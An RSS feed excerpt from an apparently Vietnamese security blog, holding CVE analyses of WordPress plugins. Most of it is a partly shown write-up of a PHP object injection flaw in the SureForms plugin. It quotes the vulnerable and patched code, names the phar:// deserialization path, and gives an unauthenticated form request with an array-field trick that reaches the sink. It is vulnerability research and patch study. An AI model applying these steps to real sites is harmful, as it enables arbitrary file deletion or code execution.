0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; trên dữ liệu người dùng là nguy cơ bảo mật nghiêm trọng nếu không được xác thực.&lt;/li&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;content_save_pre&lt;/code&gt; tạo ra bề mặt tấn công vì dữ liệu chưa được lọc khi đi vào hàm xử lý.&lt;/li&gt;&#xA;&lt;li&gt;Quyền Contributor đủ để kích hoạt khai thác, mức độ rủi ro cao trên môi trường đa user.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá tập trung vào thay đổi cơ chế xử lý dữ liệu đầu vào và thêm xác thực để loại bỏ khả năng tạo object tùy ý.&lt;/li&gt;&#xA;&lt;li&gt;Việc thay thế &lt;code&gt;unserialize()&lt;/code&gt; bằng cơ chế an toàn hơn như JSON là hướng xử lý đúng cho các plugin WordPress tương tự.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6742 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/</link>
      <pubDate>Wed, 19 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The SureForms – Drag and Drop Form Builder for WordPress&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong tất cả các phiên bản cho đến, và bao gồm, 1.7.3 thông qua việc sử dụng &lt;strong&gt;file_exists()&lt;/strong&gt; trong hàm &lt;strong&gt;delete_entry_files()&lt;/strong&gt; mà không có giới hạn đối với đường dẫn được cung cấp. Điều này cho phép kẻ tấn công chưa xác thực có thể inject một &lt;strong&gt;PHP Object&lt;/strong&gt;. Không có &lt;strong&gt;POP chain&lt;/strong&gt; nào được biết đến trong phần mềm dễ bị tấn công này, nghĩa là lỗ hổng này không có tác động trừ khi một plugin hoặc theme khác chứa &lt;strong&gt;POP chain&lt;/strong&gt; được cài đặt trên site. Nếu một &lt;strong&gt;POP chain&lt;/strong&gt; tồn tại thông qua plugin hoặc theme bổ sung được cài đặt trên hệ thống mục tiêu, nó có thể cho phép kẻ tấn công thực hiện các hành động như xóa file tùy ý, lấy dữ liệu nhạy cảm, hoặc thực thi code tùy thuộc vào &lt;strong&gt;POP chain&lt;/strong&gt; hiện diện.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6742&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6742&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.7.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.7.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/sureforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;SureForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong phiên bản &lt;code&gt;1.7.3&lt;/code&gt;, hàm &lt;code&gt;delete_entry_files()&lt;/code&gt; nhận vào một &lt;code&gt;$file_url&lt;/code&gt;, sau đó decode url và chuyển đổi thành đường dẫn bằng &lt;code&gt;$file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo nó gọi trực tiếp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file if it exists.&#xA;if ( file_exists( $file_path ) ) {&#xA;    unlink( $file_path );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đoạn code này kiểm tra sự tồn tại của file bằng &lt;code&gt;file_exists()&lt;/code&gt; và sử dụng &lt;code&gt;unlink()&lt;/code&gt; để xóa nếu nó tồn tại.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#34; title=&#34;Sự thay đổi trong bản vá&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi trong bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#39; alt=&#34;Diff&#34; height=&#34;602&#34; width=&#34;1892&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi trong bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong bản vá, đoạn code trên được thay thế bằng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file from the uploads directory.&#xA;Helper::delete_upload_file_from_subdir( $file_url, &amp;#39;sureforms/&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function delete_upload_file_from_subdir( $file_url, $subdir = &amp;#39;sureforms/&amp;#39; ) {&#xA;    // Decode the file URL.&#xA;    $file_url = urldecode( $file_url );&#xA;&#xA;    // Check if the file URL is empty.&#xA;    if ( empty( $file_url ) || ! is_string( $file_url ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Normalize and sanitize the subdirectory.&#xA;    $subdir = trailingslashit( sanitize_text_field( $subdir ) );&#xA;&#xA;    // Get the base upload directory.&#xA;    $upload_dir       = wp_upload_dir();&#xA;    $base_upload_path = trailingslashit( $upload_dir[&amp;#39;basedir&amp;#39;] ) . $subdir;&#xA;&#xA;    // Extract only the filename from URL.&#xA;    $filename = basename( $file_url );&#xA;&#xA;    // Construct the full file path.&#xA;    $file_path = $base_upload_path . $filename;&#xA;&#xA;    // Resolve real paths.&#xA;    $real_file_path = realpath( $file_path );&#xA;    $real_base_path = realpath( $base_upload_path );&#xA;&#xA;    // Security check: ensure file is inside the target subdir.&#xA;    if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Delete if file exists.&#xA;    if ( file_exists( $real_file_path ) ) {&#xA;        return unlink( $real_file_path );&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm mới &lt;code&gt;delete_upload_file_from_subdir()&lt;/code&gt; thực hiện nhiều bước kiểm tra bảo mật, chỉ cho phép xóa file nằm trong thư mục &lt;code&gt;uploads/sureforms/&lt;/code&gt;, với tên file hợp lệ.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Theo như mô tả thì CVE này liên quan đến lỗ hổng PHP Object Injection mà sink ở đây là hàm &lt;code&gt;file_exists()&lt;/code&gt; thì chỉ có xảy ra với trường hợp &lt;strong&gt;PHAR Deserialization&lt;/strong&gt;, tức &lt;code&gt;$file_path&lt;/code&gt; ở đây phải thuộc dạng &lt;code&gt;phar://phar_file&lt;/code&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public static function delete_entry_files( $entry_id ) {&#xA;    if ( ! $entry_id ) {&#xA;        return;&#xA;    }&#xA;    // Get the entry data to get the file URLs.&#xA;    $form_data = Entries::get_form_data( $entry_id );&#xA;    if ( empty( $form_data ) ) {&#xA;        return;&#xA;    }&#xA;    foreach ( $form_data as $field_name =&amp;gt; $value ) {&#xA;        // Continue to the next iteration if the field name does not contain &amp;#39;srfm-upload&amp;#39; and value is not an array.&#xA;        if ( false === strpos( $field_name, &amp;#39;srfm-upload&amp;#39; ) &amp;amp;&amp;amp; ! is_array( $value ) ) {&#xA;            continue;&#xA;        }&#xA;        foreach ( $value as $file_url ) {&#xA;            // If the file URL is empty, skip to the next iteration.&#xA;            if ( empty( $file_url ) ) {&#xA;                continue;&#xA;            }&#xA;            $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&#xA;            // Delete the file if it exists.&#xA;            if ( file_exists( $file_path ) ) {&#xA;                unlink( $file_path );&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi xem qua logic của hàm &lt;code&gt;delete_entry_files()&lt;/code&gt;, tôi nhận thấy các từ khóa như &lt;code&gt;entries&lt;/code&gt; xuất hiện khá nhiều. Có sự trùng hợp ở đây:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#34; title=&#34;Entry trong UI&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry.png&#34; data-sub-html=&#34;&lt;h2&gt;Entry&lt;/h2&gt;&lt;p&gt;Entry trong UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#39; alt=&#34;Entry&#34; height=&#34;636&#34; width=&#34;1342&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entry trong UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Có vẻ đúng, nhưng như bạn thấy thông báo &lt;code&gt;&amp;quot;No records found&amp;quot;&lt;/code&gt;, chưa có dữ liệu nào để hiển thị. Vậy ta thêm như nào?&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_data = Entries::get_form_data( $entry_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhìn vào tên hàm được gọi: &lt;code&gt;get_form_data&lt;/code&gt; thì khả năng cao dữ liệu được lấy từ form do client submit vì lỗ hổng này được công bố là &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thử tạo form bằng chức năng của plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#34; title=&#34;Tạo form&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Tạo form&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;998&#34; width=&#34;1343&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo form&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tạo post và embed shortcode của form vừa tạo:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#34; title=&#34;Embed Shortcode&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/embed.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed&lt;/h2&gt;&lt;p&gt;Embed Shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#39; alt=&#34;Embed&#34; height=&#34;507&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed Shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy cập form được tạo và submit dữ liệu bất kỳ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 730&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field&amp;#34;&#xA;&#xA;testing&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#34; title=&#34;Submit form từ Unauthenticated user&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/submit.png&#34; data-sub-html=&#34;&lt;h2&gt;Capture request&lt;/h2&gt;&lt;p&gt;Submit form từ Unauthenticated user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#39; alt=&#34;Capture request&#34; height=&#34;861&#34; width=&#34;1496&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Submit form từ Unauthenticated user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Response trả về một số trường như: &lt;strong&gt;trạng thái&lt;/strong&gt; và &lt;strong&gt;id&lt;/strong&gt; của submit.&lt;/p&gt;&#xA;&lt;p&gt;Tên &lt;code&gt;delete_entry_files&lt;/code&gt; đề cập đến việc xóa một entry, ta thử đặt breakpoint đầu hàm và thử xóa 1 entry.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; title=&#34;Debugger hoạt động khi xóa entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; data-sub-html=&#34;&lt;h2&gt;Entry Delete&lt;/h2&gt;&lt;p&gt;Debugger hoạt động khi xóa entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#39; alt=&#34;Entry Delete&#34; height=&#34;1082&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger hoạt động khi xóa entry&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tiếp tục debug&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#34; title=&#34;Gái trị của $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Gái trị của $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#39; alt=&#34;Value&#34; height=&#34;747&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gái trị của $value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy &lt;code&gt;$value&lt;/code&gt; là giá trị do ta kiểm soát. &lt;code&gt;$value&lt;/code&gt; cần phải là một mảng để nó không bị bỏ qua &lt;code&gt;continue&lt;/code&gt; và để &lt;code&gt;file_exists()&lt;/code&gt; có thể được gọi.&lt;/p&gt;&#xA;&lt;p&gt;Để &lt;code&gt;$value&lt;/code&gt; là một mảng, ta submit với name chứa &lt;code&gt;[]&lt;/code&gt; ở cuối:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;testing&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#34; title=&#34;Gái trị của $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value1.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Gái trị của $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#39; alt=&#34;Value&#34; height=&#34;891&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gái trị của $value&lt;/figcaption&gt;&#xA;  